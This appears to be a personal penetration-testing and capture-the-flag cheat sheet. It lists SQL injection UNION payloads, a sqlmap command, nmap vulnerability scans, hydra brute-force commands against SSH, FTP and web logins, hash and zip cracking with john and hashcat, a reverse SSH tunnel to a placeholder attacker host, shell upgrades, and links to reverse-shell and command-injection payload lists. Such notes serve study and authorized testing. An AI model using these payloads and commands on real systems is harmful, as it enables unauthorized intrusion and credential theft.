# Configuring new machine
Apt-get update && apt-get upgrade <br />
Apt-get dist-upgrade <br />
### Installing rdp
Apt-get install xrdp<br /><br />
After xrdp is installed you can start the server with the following command:<br />
Service xrdp start<br />
Service xrdp-sesman start <br />
update-rc.d xrdp enable <br />

### Install Terminator
sudo apt-get install terminator


### XSS
Cheatsheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

### SQL Injection
https://www.codecademy.com/articles/sql-commands<br/>
Cheatsheet: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
' UNION select 1 from information_schema.tables # <br />
' UNION select 1,2 from information_schema.tables #<br />
' UNION select 1,2,3 from information_schema.tables #<br /><br /><br />

' UNION select 1,table_schema,table_name from information_schema.tables #<br />
' UNION select 1,table_name,column_name from information_schema.columns #<br /><br />

sqlmap --url http://tbfc.net/login.php --tables --columns <br/>
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://github.com/payloadbox/sql-injection-payload-list
### Nmap
Scan for vulnerabilities: nmap -Pn --script vuln 10.x.x.x
nmap --script http-enum -p 80 xx.xx.xx.xx  <br />

- nmap -sC -sV -Av -oN nmap/anthem 10.10.139.243

-sC - run all the default scripts
-sV - find the version of all the service running on the target
-A - run the scan in aggressive mode
-v - show output in verbose mode
### RSA
https://github.com/ius/rsatool<br />
https://github.com/Ganapati/RsaCtfTool

### SSH
https://medium.com/bugbountywriteup/cracking-ssh-private-key-passphrase-459ba17e8d5d

- scp name@ip:/home/dir/file.name $(pwd)   - dowloading file from ssh
### SSH tunelling
 - netstat -tulpn - what services are running
 - ssh -R 9001:127.0.0.1:9001 attacker@<attacker_ip>
### HASH
Identify hashes: https://hashes.com/en/tools/hash_identifier<br />
- https://www.tunnelsup.com/hash-analyzer/
Tool to identify hashes: https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master <br />
- *wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py*<br /> 
- *python3 hash-id.py*
- https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/
- john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 crack.txt
- hashcat -m 1410 -a 0 hash:salt --username test_user /usr/share/wordlists/rockyou.txt - sha256 with salt
- https://medium.com/infosec-adventures/identifying-and-cracking-hashes-7d580b9fd7f1
- https://gchq.github.io/CyberChef/
### Active Directory
PowerView-3.0 tips and tricks https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

### Ghostcat
https://github.com/00theway/Ghostcat-CNVD-2020-10487

### Steganogrphy
- https://pequalsnp-team.github.io/cheatsheet/steganography-101 <br />
- https://github.com/DominicBreuker/stego-toolkit
- https://en.wikipedia.org/wiki/List_of_file_signatures
- binwalk -e file
- foremost -i file : extracts data from the given file.
- steghide extract -sf regular_image.jpeg
-  stegcracker regular_image.jpg /usr/share/wordlists/rockyou.txt 
<br>
-checklist : https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/steganography

### Java Deserialization Vulnerabilities
https://github.com/joaomatosf/jexboss

### commands
sudo -l -U user <br />
https://gtfobins.github.io/

### Shell
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  <br />
https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

 enumeration start with “sudo -l -l” 
 If no command is specified, the -l (list) option will list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. If a command is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments. If command is specified but not allowed, sudo will exit with a status value of 1. If the -l option is specified with an l argument (i.e. -ll), or if -l is specified multiple times, a longer list format is used. 
 
 -https://netsec.ws/?p=337 - interactive tty
 python3 -c 'import pty;pty.spawn("/bin/bash")'

### command injection 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md

 ### Gobuster
  - gobuster dir -u xxx.xx.x.x -w /usr/share/wordlists/dirb/common.txt   
  - gobuster dir -u xxx.xx.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

### Fuzz
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt localhost:80/FUZZ/note.txt
### other
Enable or disable protocols, ciphers, hashes and key exchange algorithms on Windows Server 2008, 2012, 2016 and 2019 : https://www.nartac.com/Products/IISCrypto


### brutforce
#### FTP & SSH
- hydra -l username ftp://xxxxxxxxx -P /usr/share/wordlists/rockyou.txt   
- hydra -l username -v -V -P /usr/share/wordlists/rockyou.txt xxx.xx.xx.xx ssh

#### web
hydra -l <username> -P <wordlist> xxx.xxx.xx.xx http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
<br /> https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/
#### zip files
- zip2john zipName.zip >zip.hash  - for john friendly hash
- john zipName.zip zip.hash

### process snooping
https://github.com/DominicBreuker/pspy
